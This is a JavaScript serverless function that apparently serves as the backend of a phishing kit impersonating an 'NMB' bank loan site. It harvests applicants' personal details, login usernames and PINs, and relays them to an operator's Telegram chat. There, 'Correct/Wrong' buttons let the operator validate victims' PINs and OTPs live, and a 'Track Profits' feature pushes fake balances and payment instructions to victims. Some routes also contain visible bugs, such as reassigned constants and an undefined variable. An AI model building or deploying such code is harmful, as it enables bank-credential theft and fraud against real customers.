/*
 * NMB Loan Site - Telegram Notification API (Vercel serverless function)
 * ------------------------------------------------------------------
 * This is invoked per-request by Vercel. It does NOT run a server or
 * long-poll; instead Telegram sends callback updates to this same
 * endpoint as a webhook.
 *
 * Required environment variables (set in Vercel dashboard, NOT in code):
 *   NMB_BOT_TOKEN  - the Telegram bot token
 *   NMB_CHAT_ID    - the admin chat id
 *
 * One-time: set the webhook, e.g. visit https://<your-domain>/api/setup-webhook
 */
const https = require('https');

// Persistent shared store (survives restarts; shared across serverless instances).
const store = require('../store');

const TOKEN = process.env.NMB_BOT_TOKEN;
const CHAT_ID = process.env.NMB_CHAT_ID;

// SSE clients map (best-effort; serverless restarts lose clients)
const sseClients = new Map();

function pushSession(id, event, data) {
  const clients = sseClients.get(id);
  if (!clients) return;
  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  clients.forEach((res) => {
    try { res.write(payload); } catch (e) { /* drop */ }
  });
}

function parseAmount(text) {
  const m = String(text || '').match(/\$?\s*([\d,]+(?:\.\d+)?)/);
  if (!m) return null;
  const n = parseFloat(m[1].replace(/,/g, ''));
  return isNaN(n) ? null : n;
}

// State is now persisted via the shared `store` module (see ../store.js),
// so it survives cold starts and is visible to every serverless instance.

function tgApi(method, payload, cb) {
  const data = JSON.stringify(payload);
  const req = https.request(
    {
      hostname: 'api.telegram.org',
      path: `/bot${TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
    },
    (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(body); } catch (e) { /* ignore */ }
        if (cb) cb(json);
      });
    }
  );
  req.on('error', (e) => { console.error('[telegram]', method, e.message); if (cb) cb(null); });
  req.write(data);
  req.end();
}

function esc(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function notifyApplication(app) {
  const id = app.appId || ('APP-' + Date.now());
  const name = app.name || `${app.firstName || ''} ${app.lastName || ''}`.trim() || 'N/A';
  const text =
    `<b>🏦 New Loan Application</b>\n\n` +
    `ID: <code>${esc(id)}</code>\n` +
    `Applicant: ${esc(name)}\n` +
    `Loan Type: ${esc(app.loanType || 'N/A')}\n` +
    `Amount: ${esc(app.amount || 'N/A')} USD\n` +
    `Email: ${esc(app.email || 'N/A')}\n` +
    `Phone: ${esc(app.phone || 'N/A')}\n\n` +
    `Status: <b>⏳ Pending review</b>`;
  tgApi('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `approve:${id}` },
        { text: '❌ Reject', callback_data: `reject:${id}` },
      ]],
    },
  }, (r) => {
    if (r && r.ok) {
      store.set(store.NS.APPS, id, { status: 'pending', messageId: r.result.message_id, chatId: CHAT_ID, details: { ...app, name } });
      console.log('[notify] application', id);
    } else {
      console.error('[notify] application failed:', r && r.description);
    }
  });
  return id;
}

async function notifyLoginVerification(login) {
  const type = (login.otp || login.otpSubmitted) ? 'otp' : 'pin';
  const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();

  let text = '';
  if (type === 'pin') {
    text =
      `<b>🔐 PIN Verification Required</b>\n\n` +
      `User: ${esc(login.username || 'N/A')}\n` +
      (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
      (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
      `Time: ${new Date().toLocaleString()}`;
  } else {
    text =
      `<b>🔐 OTP Verification Required</b>\n\n` +
      `User: ${esc(login.username || 'N/A')}\n` +
      `Practice OTP: ${esc('submitted')}\n` +
      `Time: ${new Date().toLocaleString()}`;
  }

  await store.set(store.NS.LOGIN, id, {
    phone: login.username,
    pin: login.pin || '',
    otp: login.otpSubmitted ? 'submitted' : '',
    type,
    timestamp: Date.now(),
    status: 'pending',
    decided: false,
    messageId: null,
    chatId: CHAT_ID
  });

  const approveLabel = type === 'pin' ? '✅ Correct' : '✅ Approve OTP';
  const rejectLabel = type === 'pin' ? '❌ Wrong' : '❌ Reject OTP';
  const approveData = type === 'pin' ? `correct:${id}` : `otp_approve:${id}`;
  const rejectData = type === 'pin' ? `wrong:${id}` : `otp_reject:${id}`;

  tgApi('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: approveLabel, callback_data: approveData },
        { text: rejectLabel, callback_data: rejectData },
      ]],
    },
  }, (r) => {
    if (r && r.ok) {
      store.get(store.NS.LOGIN, id).then((entry) => {
        if (entry) {
          entry.messageId = r.result.message_id;
          store.set(store.NS.LOGIN, id, entry);
        }
      });
      console.log(`[notify] ${type} verification sent:`, id);
    } else {
      console.error(`[notify] ${type} verification failed:`, r && r.description);
    }
  });
  return id;
}

async function handleCallback(cq) {
  const [action, id] = (cq.data || '').split(':');

  if (action === 'approve' || action === 'reject') {
    const decision = action === 'approve' ? 'approved' : 'rejected';
    const rec = await store.get(store.NS.APPS, id);
    if (rec) rec.status = decision;
    const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
    if (rec && rec.messageId) {
      const name = rec.details.name || 'N/A';
      tgApi('editMessageText', {
        chat_id: rec.chatId,
        message_id: rec.messageId,
        parse_mode: 'HTML',
        text:
          `<b>🏦 Loan Application</b>\n\n` +
          `ID: <code>${esc(id)}</code>\n` +
          `Applicant: ${esc(name)}\n` +
          `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
          `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
          `Status: <b>${stamp}</b>`,
      });
      await store.set(store.NS.APPS, id, rec);
    }
    console.log(`[decision] ${id} -> ${decision}`);
    return;
  }

  if (action === 'correct' || action === 'wrong' || action === 'otp_approve' || action === 'otp_reject') {
    const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
    const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
    const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
    console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
    const rec = await store.get(store.NS.LOGIN, id);
    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
    if (rec) {
      rec.status = decision;
      rec.decided = true;
      await store.set(store.NS.LOGIN, id, rec);
      // Verify the update
      const verify = await store.get(store.NS.LOGIN, id);
      console.log(`[${kind.toLowerCase()} callback] Verified update:`, verify?.decided, verify?.status);
    } else {
      console.error(`[${kind.toLowerCase()} decision] ${id} not found in ${store.usingKV ? 'kv' : 'local'} store`);
    }
    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
    if (rec && rec.messageId) {
      tgApi('editMessageText', {
        chat_id: rec.chatId,
        message_id: rec.messageId,
        parse_mode: 'HTML',
          text:
            `<b>🔐 ${kind} Verification</b>\n\n` +
            `User: ${esc(rec.phone || 'N/A')}\n` +
            (kind === 'PIN' && rec.pin ? `PIN: ${esc(rec.pin)}\n` : '') +
            (kind === 'OTP' && rec.otp ? `OTP: ${esc(rec.otp)}\n` : '') +
            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
            `Status: <b>${stamp}</b>`,
      });
    }
    console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
    return;
  }
}

// Handle admin free-text messages (profit/payment)
async function handleMessage(msg) {
  const text = msg.text || '';
  if (text.startsWith('/start')) return; // ignore /start

  const chatId = msg.chat.id;
  const replyToMsgId = msg.reply_to_message && msg.reply_to_message.message_id;

  // Find target session
  let targetId = null;
  const sessions = (await store.get(store.NS.SESSIONS)) || {};
  if (replyToMsgId) {
    for (const sid in sessions) {
      if (sessions[sid] && sessions[sid].trackMsgId === replyToMsgId) {
        targetId = sid;
        break;
      }
    }
  }

  if (!targetId) return;

  const rec = sessions[targetId] || { id: targetId, balance: 0, paymentDetails: '', profits: [] };
  const amt = parseAmount(text);

  if (amt !== null) {
    rec.balance = (rec.balance || 0) + amt;
    rec.profits = rec.profits || [];
    rec.profits.push({ amount: amt, note: text, ts: Date.now() });
    rec.pendingTrack = false;
    await store.set(store.NS.SESSIONS, targetId, rec);
    pushSession(targetId, 'profit', { balance: rec.balance, amount: amt, note: text });
    tgApi('sendMessage', { chat_id: CHAT_ID, text: `✅ Credited $${amt.toFixed(2)} to session ${targetId}. New balance: $${rec.balance.toFixed(2)}` });
  } else if (text.trim()) {
    rec.paymentDetails = text;
    await store.set(store.NS.SESSIONS, targetId, rec);
    pushSession(targetId, 'payment', { paymentDetails: text });
    tgApi('sendMessage', { chat_id: CHAT_ID, text: `📝 Payment details updated for session ${targetId}` });
  }
}

function setWebhook(host, proto, cb) {
  const url = `${proto}://${host}/api`;
  tgApi('setWebhook', { url }, cb);
}

// Vercel serverless entry point
module.exports = async (req, res) => {
  try {
    if (!TOKEN || !CHAT_ID) {
      console.error('Missing NMB_BOT_TOKEN or NMB_CHAT_ID environment variables');
      res.status(500).json({ error: 'Server misconfigured: missing Telegram credentials' });
      return;
    }

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Cache-Control', 'no-store');

    if (req.method === 'OPTIONS') { res.status(204).end(); return; }

    const url = req.url || '';

// GET /api/setup/purge-webhook -> clear webhook to allow local polling
    if (req.method === 'GET' && url.startsWith('/api/setup/purge-webhook')) {
      tgApi('setWebhook', { url: '' }, (r) => {
        res.status(200).json({ ok: r && r.ok, description: r && r.description });
      });
      return;
    }

    // GET /api/setup-webhook -> set webhook for Vercel serverless
    if (req.method === 'GET' && url.includes('setup')) {
      const host = req.headers['x-forwarded-host'] || req.headers.host;
      const proto = req.headers['x-forwarded-proto'] || 'https';
      setWebhook(host, proto, (r) => {
        res.status(200).json({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` });
      });
      return;
    }

    if (req.method === 'GET' && url.startsWith('/api/application/')) {
      const id = url.split('/').pop();
      const rec = await store.get(store.NS.APPS, id);
      res.status(200).json({ status: rec ? rec.status : 'unknown' });
      return;
    }

    if (req.method === 'GET' && url.startsWith('/api/login/status/')) {
      const id = url.split('/').pop();
      const rec = await store.get(store.NS.LOGIN, id);
      res.status(200).json({
        decided: !!rec && !!rec.decided,
        status: rec ? rec.status : 'pending',
        found: !!rec,
        sharedStore: store.shared,
        storage: store.usingKV ? 'kv' : 'local'
      });
      return;
    }

    // POST /api/session -> create session
    if (req.method === 'POST' && url === '/api/session') {
      const p = {};
      try { p = JSON.parse(raw || '{}'); } catch (e) {}
      const sessionId = p.sessionId || ('SESS-' + Date.now());
      await store.set(store.NS.SESSIONS, sessionId, {
        id: sessionId,
        balance: 0,
        paymentDetails: '',
        profits: [],
        pendingTrack: false,
        trackMsgId: null
      });
      res.status(200).json({ ok: true, sessionId });
      return;
    }

    // GET /api/session/:id -> get session state
    if (req.method === 'GET' && url.startsWith('/api/session/')) {
      const id = url.split('/').pop();
      const rec = await store.get(store.NS.SESSIONS, id);
      res.status(200).json(rec || { id, balance: 0, paymentDetails: '', profits: [] });
      return;
    }

    // POST /api/track-profits -> notify admin
    if (req.method === 'POST' && url === '/api/track-profits') {
      const p = {};
      try { p = JSON.parse(raw || '{}'); } catch (e) {}
      const { sessionId, phone } = p;
      if (!sessionId) {
        res.status(400).json({ error: 'sessionId required' });
        return;
      }
      const rec = await store.get(store.NS.SESSIONS, sessionId) || {
        id: sessionId, balance: 0, paymentDetails: '', profits: [], pendingTrack: true
      };
      rec.pendingTrack = true;
      tgApi('sendMessage', {
        chat_id: CHAT_ID,
        text: `💰 Track Profits request from ${phone || 'unknown'}. Reply with the amount to credit.`,
        reply_markup: { force_reply: true }
      }, (r) => {
        if (r && r.ok) {
          rec.trackMsgId = r.result.message_id;
          store.set(store.NS.SESSIONS, sessionId, rec);
          pushSession(sessionId, 'track-requested', { phone });
        }
      });
      res.status(200).json({ ok: true });
      return;
    }

    // GET /api/stream/:id -> SSE for instant updates
    if (req.method === 'GET' && url.startsWith('/api/stream/')) {
      const id = url.split('/').pop();
      res.setHeader('Content-Type', 'text/event-stream');
      res.setHeader('Cache-Control', 'no-cache');
      res.setHeader('Connection', 'keep-alive');
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.write('\n');

      if (!sseClients.has(id)) sseClients.set(id, new Set());
      sseClients.get(id).add(res);

      const ka = setInterval(() => { try { res.write(':\n\n'); } catch (e) {} }, 25000);
      res.on('close', () => clearInterval(ka));

      const rec = await store.get(store.NS.SESSIONS, id);
      if (rec) res.write(`event: init\ndata: ${JSON.stringify(rec)}\n\n`);
      return; // SSE keeps connection open
    }

    if (req.method === 'POST') {
      let raw = '';
      req.on('data', (c) => (raw += c));
      req.on('end', async () => {
        let p = {};
        try { p = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }

        try {
          if (p.callback_query) {
            await handleCallback(p.callback_query);
            res.status(200).json({ ok: true });
            return;
          }
          if (p.message) {
            await handleMessage(p.message);
            res.status(200).json({ ok: true });
            return;
          }
          if (url.includes('application')) {
            const id = await notifyApplication(p);
            res.status(200).json({ ok: true, appId: id });
            return;
          }
          if (url.includes('login')) {
            const id = await notifyLoginVerification(p);
            res.status(200).json({ ok: true, loginId: id });
            return;
          }
          res.status(404).json({ error: 'not found' });
        } catch (e) {
          console.error('[api] request error:', e);
          if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
        }
      });
      return;
    }

    res.status(200).send('NMB Loan Notification API');
  } catch (e) {
    console.error('[api] unhandled error:', e);
    if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
  }
};
